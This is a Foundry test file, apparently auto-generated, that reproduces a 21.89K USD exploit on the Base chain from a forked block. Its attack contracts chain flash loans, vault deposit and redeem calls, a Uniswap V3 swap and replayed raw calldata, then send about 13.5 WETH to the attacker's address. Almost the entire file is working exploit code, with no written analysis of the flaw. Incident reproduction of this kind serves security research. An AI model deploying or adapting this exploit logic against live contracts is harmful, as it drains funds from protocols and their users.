// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 21.89K USD
// Attacker : 0xa27eae743cd8c03e9b7c25ebf43dadbbc6df9bfa
// Attack Contract : 0x870e3d0f18ce5e0894e206c68885f2b6dba16199
// Vulnerable Contract : N/A
// Attack Tx : 0x2f2e12fbdf541c28f3667153e5338f73a313096338dc5ca592453566debcd790
// Block : 47958575
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 21.37K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 47958574;
    uint256 constant TX_TIMESTAMP = 1782706497;
    uint256 constant TX_BLOCK_NUMBER = 47958575;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 92;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _alignAttackerNonceF();
        attack = new OurAttack();
        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
    }

    function _alignAttackerNonceF() internal {
        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild_1());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WETH, "WETH", 13529208049869507356);
    }
}

contract OurAttack {
    AttackChild_1 public attackChild_1;

    constructor() payable {
        _deployAttackChild();
    }

    function attack() public payable {
        attackChild_1.deployFlashLoanChild(Addresses.ERC1967Proxy_2020, 12920000000000000000);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function _deployAttackChild() internal returns (address) {
        attackChild_1 = new AttackChild_1();
        require(address(attackChild_1) == 0xC1fd603C61cd3E6dcAF2178d3844bE9a7f3d0A6E, "unexpected attack child");
        return address(attackChild_1);
    }
}

contract AttackChild {
    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackData) external payable {
        amount;
        callbackData;
        borrowWeth();
        return;
    }

    function run() external payable {
        borrowUsd0AndProfit();
        return;
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        bytes calldata userData
    ) external payable {
        tokens;
        amounts;
        fees;
        userData;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xfa461e33) {
            swapCallback();
            return;
        }
    }

    function flashLoanCallback2() external payable {
        swapCallback();
        return;
    }

    function repayBalancerVault() external {
        _repayBalancerToken(Addresses.WETH, 12920000000000000000);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancerToken(tokens[i], amounts[i]);
        }
    }

    function _repayBalancerToken(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.BalancerVault, amount);
    }

    function replayProfit() external {
        if (!_settleDone(1, 96)) {
            bool profitAlreadyPaid = false;
            if (Harness.safeBalance(Addresses.WETH, Addresses.attacker_eoa) >= 13529208049869507356) {
                _markSettle(1, 96);
                profitAlreadyPaid = true;
            }
            if (!profitAlreadyPaid) {
                _markSettle(1, 96);
                uint256 settleAmount = 13529208049869507356;
                IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function borrowWeth() public payable {
        bytes memory observedCallData =
            hex"5c38449e00000000000000000000000047e775b8f175034b22fba3a0f5b9e0f02551af3c000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000042000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000b34d0f8c020c00000000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0000 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool ok,) = Addresses.BalancerVault.call(observedCallData);
        require(ok, "observed raw calldata 0x5c38449e failed");
    }

    function borrowUsd0AndProfit() internal {
        bytes memory observedCallData =
            hex"e0232b42000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000000000000000000000000000000001989f449e7000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0001 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool ok,) = Addresses.A_BBBBBB_FFCB.call(observedCallData);
        require(ok, "observed raw calldata 0xe0232b42 failed");
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 profitAmount = 13529208049869507356;
        IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, profitAmount);
    }

    function flashCallback() public payable {
        IERC1967Proxy_2020(Addresses.ERC1967Proxy_2020).deposit(1755018731120, address(this));
        IERC20Like(Addresses.WETH).transfer(Addresses.ERC1967Proxy_2020, 12920000000000000000);
        uint256 redeemShares = 2215431464245;
        IERC1967Proxy_2020(Addresses.ERC1967Proxy_2020).redeem(redeemShares, address(this), address(this));
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        bytes memory observedCallData =
            hex"128acb0800000000000000000000000047e775b8f175034b22fba3a0f5b9e0f02551af3c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003ebbfa452000000000000000000000000fffd8963efd1fc6a506488495d951d5263988d2500000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0018 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool ok,) = Addresses.UniswapV3Pool.call(observedCallData);
        require(ok, "observed raw calldata 0x128acb08 failed");
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        uint256 repaymentAmount = 12920000000000000000;
        IERC20Like(Addresses.WETH).transfer(Addresses.BalancerVault, repaymentAmount);
    }

    function swapCallback() internal {
        IERC20Like(Addresses.USDC).transfer(Addresses.UniswapV3Pool, 16840107090);
    }

    function approveLenders() public {
        IERC20Like(Addresses.USDC).approve(Addresses.ERC1967Proxy_2020, type(uint256).max);
        IERC20Like(Addresses.USDC).approve(Addresses.A_BBBBBB_FFCB, type(uint256).max);
    }
}

contract AttackChild_1 {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x9dea934a) {
            (address vault, uint256 amount) = abi.decode(msg.data[4:], (address, uint256));
            deployFlashLoanChild(vault, amount);
            return;
        }
    }

    function deployFlashLoanChild(address vault, uint256 amount) public payable {
        require(vault == Addresses.ERC1967Proxy_2020, "unexpected vault");
        require(amount == 12920000000000000000, "unexpected amount");
        AttackChild attackChild = new AttackChild();
        require(address(attackChild) == Addresses.attack_child, "unexpected attack child");
        attackChild.approveLenders();
        attackChild.run();
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant UNI_V3_POS = 0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1;
    address internal constant FiatTokenV2_2 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779;
    address internal constant ERC1967Proxy = 0x3C100a81F70b6B7129b6852d41148a5ab3d7f817;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant attack_child = 0x47e775b8f175034b22fbA3A0F5B9E0F02551Af3C;
    address internal constant UniswapV3Pool = 0x6c561B446416E1A00E8E93E221854d6eA4171372;
    address internal constant ERC1967Proxy_2020 = 0x72dbAA8A09d71D09c6De0de439968e1E7c122020;
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant attack_path_entry = 0x870E3d0F18CE5E0894E206c68885f2b6Dba16199;
    address internal constant attacker_eoa = 0xA27eAE743Cd8C03E9b7c25ebF43DADbBC6Df9bFA;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_BBBBBB_FFCB = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant attack_child_0A6E = 0xC1fd603C61cd3E6dcAF2178d3844bE9a7f3d0A6E;
    address internal constant A_C7D5AC_355F = 0xc7d5acAEA25F06450aAe5a6Ee0ec5F70d4fe355f;
    address internal constant ERC1967Proxy_CF9F = 0xe6644AE61EcA940B1201e0fe2c0574b3bE60cf9F;
    address internal constant A_FFFD89_8D25 = 0xfFfd8963EFd1fC6A506488495d951d5263988d25;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IBalancerVault {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IContract_BBBBBB_FFCB {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IERC1967Proxy_2020 {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
}

interface Iattack_child {
    function run() external;
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
